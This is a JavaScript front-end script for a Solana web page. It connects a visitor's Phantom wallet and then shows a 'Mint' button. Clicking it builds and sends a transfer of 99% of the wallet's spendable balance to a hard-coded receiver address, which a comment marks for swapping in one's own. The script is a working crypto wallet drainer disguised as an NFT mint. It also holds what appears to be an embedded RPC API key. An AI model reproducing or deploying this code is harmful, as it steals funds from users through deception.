$(document).ready(function () {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                console.log("Phantom Wallet connected:", resp);

                const connection = new solanaWeb3.Connection(
                    'https://solana-mainnet.api.syndica.io/api-key/42aSFR7aLhxB7NfXEq78aMvkfweu58G4ngdwhri32u9BAaaQ9wShomjTtKH9RCKJDpS3sxRGQXeZk3Wp8s8BDbLPjmLTCqTHhoN',
                    'confirmed'
                );

                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                const walletBalance = await connection.getBalance(public_key);
                console.log("Wallet balance:", walletBalance);

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                if (walletBalance < minBalance) {
                    alert("Insufficient funds for rent.");
                    return;
                }

                $('#connect-wallet').text("Mint");
                $('#connect-wallet').off('click').on('click', async () => {
                    try {
                        const receiverWallet = new solanaWeb3.PublicKey('6LvPKGmA5hTfPqrwfXr9VTyGtxMLrc9dzPeL8QoM2Y5E'); // Замените адрес
                        const balanceForTransfer = walletBalance - minBalance;

                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds for transfer.");
                            return;
                        }

                        const transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: public_key,
                                toPubkey: receiverWallet,
                                lamports: balanceForTransfer * 0.99,
                            })
                        );

                        transaction.feePayer = resp.publicKey;

                        const blockhashInfo = await connection.getLatestBlockhash();
                        console.log("Blockhash info:", blockhashInfo);
                        transaction.recentBlockhash = blockhashInfo.blockhash;

                        console.log("Transaction object before signing:", transaction);
                        const signed = await window.solana.signTransaction(transaction);
                        console.log("Signed transaction:", signed);

                        const txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);
                        console.log("Transaction confirmed:", txid);
                        alert(Transaction successful! TxID: ${txid});
                    } catch (err) {
                        console.error("Error during minting:", err.message);
                        console.error("Full error object:", err);
                        alert("Minting failed. Check console for details.");
                    }
                });
            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
            }
        } else {
            alert("Phantom extension not found.");
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;

            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                alert("Please download the Phantom extension for your browser.");
            }
        }
    });
});
